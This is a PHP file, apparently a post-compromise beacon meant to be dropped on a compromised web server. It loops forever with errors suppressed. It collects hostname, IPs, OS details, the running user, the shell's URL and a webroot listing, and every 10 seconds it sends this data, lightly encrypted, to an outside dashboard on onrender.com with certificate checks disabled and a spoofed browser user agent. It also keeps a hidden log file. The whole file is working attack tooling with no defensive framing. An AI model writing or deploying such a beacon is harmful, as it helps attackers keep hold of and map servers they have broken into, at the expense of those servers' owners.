<?php
/**
 * beacon.php — PHP beacon with continuous loop + 10s ping interval
 *
 * Drop on target. Visit once. It loops forever, pinging the dashboard
 * every 10 seconds, keeping the site ONLINE on the dashboard.
 */

// ============================================================
// CONFIG
// ============================================================

$DASHBOARD_URL = "https://shell-maintain.onrender.com";
$SHARED_SECRET = "change_this_secret";   // MUST match dashboard
$BEACON_PATH   = "/api/beacon";
$PING_INTERVAL = 10;                     // seconds between pings
$MAX_PINGS     = 0;                      // 0 = infinite loop

// ============================================================
// KEEP REQUEST ALIVE
// ============================================================

set_time_limit(0);
ignore_user_abort(true);
@ini_set('display_errors', '0');
@error_reporting(0);

while (ob_get_level()) ob_end_flush();
ob_implicit_flush(true);

// ============================================================
// COLLECT INFO (once)
// ============================================================

function collect_info() {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host_h = $_SERVER['HTTP_HOST'] ?? (@gethostname() ?: 'cli');

    $info = [
        'host'        => @gethostname() ?: 'unknown',
        'server_ip'   => $_SERVER['SERVER_ADDR']   ?? '',
        'client_ip'   => $_SERVER['REMOTE_ADDR']   ?? '',
        'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'scheme'      => $scheme,
        'host_header' => $host_h,
        'site_url'    => $scheme . '://' . $host_h,
        'shell_url'   => $scheme . '://' . $host_h . ($_SERVER['REQUEST_URI'] ?? ''),
        'self_path'   => __FILE__,
        'self_dir'    => dirname(__FILE__),
        'doc_root'    => $_SERVER['DOCUMENT_ROOT'] ?? '',
        'php_version' => PHP_VERSION,
        'os'          => PHP_OS,
        'uname'       => @php_uname(),
        'server_sw'   => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'pid'         => function_exists('getmypid') ? getmypid() : 0,
        'keepalive'   => 1,
    ];

    // webroot sample
    $entries = [];
    if (function_exists('scandir') && is_readable($info['doc_root'])) {
        $items = @scandir($info['doc_root']);
        if ($items) {
            $i = 0;
            foreach ($items as $it) {
                if ($it === '.' || $it === '..') continue;
                $entries[] = $it;
                if (++$i >= 50) break;
            }
        }
    }
    $info['doc_root_sample'] = $entries;

    // user
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $u = @posix_getpwuid(@posix_geteuid());
        $info['user'] = $u['name'] ?? 'unknown';
    } else {
        $info['user'] = @getenv('USER') ?: (@getenv('USERNAME') ?: 'unknown');
    }

    return $info;
}

// ============================================================
// CRYPTO
// ============================================================

function derive_key($secret, $len) {
    $seed = hash('sha256', $secret, true);
    $out  = '';
    while (strlen($out) < $len) {
        $seed = hash('sha256', $seed, true);
        $out .= $seed;
    }
    return substr($out, 0, $len);
}

function xor_apply($data, $key) {
    $klen = strlen($key);
    $out  = '';
    for ($i = 0, $n = strlen($data); $i < $n; $i++) {
        $out .= $data[$i] ^ $key[$i % $klen];
    }
    return $out;
}

function encrypt_payload($plain, $secret) {
    $key = derive_key($secret, 32);
    return base64_encode(xor_apply($plain, $key));
}

// ============================================================
// SEND (curl first, streams fallback)
// ============================================================

function send_beacon($url, $secret, $info) {
    $body = encrypt_payload(json_encode([
        'secret' => $secret,
        'info'   => $info,
    ]), $secret);

    $headers = [
        "Content-Type: application/octet-stream",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "X-Beacon: 1",
        "Connection: keep-alive",
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $body,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TCP_KEEPALIVE  => 1,
        ]);
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err  = curl_error($ch);
        curl_close($ch);
        return [$code, $resp, $err ?: ''];
    }

    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => [
                'method'        => 'POST',
                'header'        => implode("\r\n", $headers) . "\r\n",
                'content'       => $body,
                'timeout'       => 10,
                'ignore_errors' => true,
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $resp = @file_get_contents($url, false, $ctx);
        $code = 0;
        if (!empty($http_response_header[0]) &&
            preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
            $code = (int)$m[1];
        }
        return [$code, $resp, $resp === false ? 'stream failed' : ''];
    }

    return [0, null, 'no http transport'];
}

// ============================================================
// MAIN LOOP
// ============================================================

$endpoint = rtrim($DASHBOARD_URL, '/') . $BEACON_PATH;
$info     = collect_info();

if (php_sapi_name() !== 'cli') {
    header('Content-Type: text/plain; charset=utf-8');
    header('X-Accel-Buffering: no');
}

$count = 0;
$failures = 0;

while (true) {
    $count++;
    $info['time'] = time();

    list($code, $resp, $err) = send_beacon($endpoint, $SHARED_SECRET, $info);

    $line = "[" . date('Y-m-d H:i:s') . "] ping #$count -> HTTP $code";
    if ($err) $line .= " err=$err";

    // log to file (keep last ~100KB)
    $logfile = sys_get_temp_dir() . '/.beacon.log';
    @file_put_contents($logfile, $line . "\n", FILE_APPEND);
    if (@filesize($logfile) > 100 * 1024) {
        @file_put_contents($logfile, $line . "\n");
    }

    // output
    if (php_sapi_name() === 'cli') {
        fwrite(STDOUT, $line . "\n");
    } else {
        echo $line . "\n";
        @flush();
    }

    // adaptive backoff on repeated failures
    if ($code >= 200 && $code < 300) {
        $failures = 0;
        $sleep = $PING_INTERVAL;
    } else {
        $failures++;
        $sleep = min(120, $PING_INTERVAL * pow(2, min($failures, 4)));
    }

    if ($MAX_PINGS > 0 && $count >= $MAX_PINGS) {
        echo "-- done after $MAX_PINGS pings --\n";
        break;
    }

    sleep($sleep);
}
